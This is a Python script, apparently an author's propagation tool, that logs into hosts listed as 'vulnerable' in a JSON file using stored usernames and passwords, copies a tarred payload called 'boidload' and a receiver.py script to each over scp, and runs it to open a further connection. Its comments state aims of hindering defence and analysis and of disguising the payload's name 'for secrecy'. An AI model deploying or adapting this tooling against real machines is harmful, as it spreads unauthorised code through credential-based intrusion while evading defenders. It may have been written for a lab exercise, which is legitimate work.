#!/usr/bin/env python3
"""
	Allan Millar
	Package sending and initiating script
"""
import sys, os, tarfile, time, pexpect, json
from pathlib import Path
from pexpect import pxssh

class sshException(Exception):
    """Unable to establish connection to machine."""

"""
We only want to send what is necessary for the computer to do what
we want, so we package only the relevant directories/files. Sending
more may make the system easier to defend against or analyze.
"""
def construct_package():
    """Grabbing the files we want to send and adding them to a 
    compressed tar file. The if simply checks if the tar exists and 
    needs to be replaced."""
    tar_file =  os.path.isfile("../prf.tar.gz")
    if tar_file:
        os.remove("../prf.tar.gz")
        with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
            tar.add("../boidfunc", arcname = "boidfunc")
            tar.add("../resources", arcname = "resources")
            tar.add("../silla", arcname = "silla")
    else:
        with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
            tar.add("../boidfunc", arcname = "boidfunc")
            tar.add("../resources", arcname = "resources")
            tar.add("../silla", arcname = "silla")
    
    #Move the tar file up one level.
    p = Path("./prf.tar.gz").absolute()
    parent_dir = p.parents[1]
    p.rename(parent_dir / p.name)

def ssh_connect(user, ip, dport, password):
    """
    Spawns a pexpect object which in this case is the connection to 
    the VM. The object ssh's into the VM, waits for the password 
    prompt, and passes the password.
    
    After succesful login, receiver.py is executed, the ssh is exited, and the
    object gets closed.
    """
    try:
        #Uncomment and move between lines to see output/debug
        #ssh.prompt()
        #print (ssh.before)
        ssh = pxssh.pxssh()
        ssh.login(ip, user, password, port = dport)
    except pxssh.ExceptionPxssh as e:
        raise sshException(e)
    return ssh

def deliver_package(user, ip, port, password):
    """
    Using the same object tell the VM to expect a file.
    Start another process on the local machine to send the tar 
    of boidload.
    Tell the VM to expect another file, this time receiver.py.
    Using the same process that sent the tar, send the script.
    
    Again the machine info will eventually need to be written 
    dynamically.
    
    Small note. The colon is necessary for both scp calls as it tells 
    the command it's copying to a remote location. If left off it creates 
    a local duplicate that creates a weird recursive tarfile, taking up 
    unnecessary space.
    
    This method can likely be improved to only spawn one pexpect process,
    however in the interest of time I am leaving it as is since it works.
    """
    
    #print("scp -P {} receiver.py {}@{}:~".format(port, user, ip))
    scp = pexpect.spawn("scp -P {} ../prf.tar.gz {}@{}:~".format(port, user, ip))
    #scp.logfile = sys.stdout.buffer
    scp.expect("password: ", timeout=120)
    scp.sendline(password)
    scp.expect(pexpect.EOF)
    scp.close()
    scp = pexpect.spawn("scp -P {} receiver.py {}@{}:~".format(port, user, ip))
    scp.expect("password: ", timeout=120)
    scp.sendline(password)
    scp.expect(pexpect.EOF)
    scp.close()
    return

def initiate(ssh):
    """Start receiver.py which should initiate another connection 
    from within boidload."""
    ssh.sendline("./receiver.py")
    return ssh

def disconnect(ssh):
    ssh.sendline("exit")
    ssh.logout()
    return

def main():
    print ("construct_package")
    construct_package()
    
    with open("../resources/index.json") as json_file:
        data = json.load(json_file)
        for device, info in data["vulnerable"].items():
            try:
                print ("\nssh_connect")
                ssh = ssh_connect(
                    info["username"], 
                    info["ip_addr"], 
                    info["port"], 
                    info["password"]
                )
            except sshException as e:
                print (e)
                continue
            print ("deliver_package")
            deliver_package(
                info["username"], 
                info["ip_addr"], 
                info["port"],
                info["password"]
            )
            print ("initiate")
            ssh = initiate(ssh)
            print ("disconnect")
            disconnect(ssh)

if __name__ == "__main__":
    main()


"""
Steps
 - don't name the tar boidload for secrecy
 - tar the three relevant (so far) directories and send to new directory
 - send receiver.py and execute
"""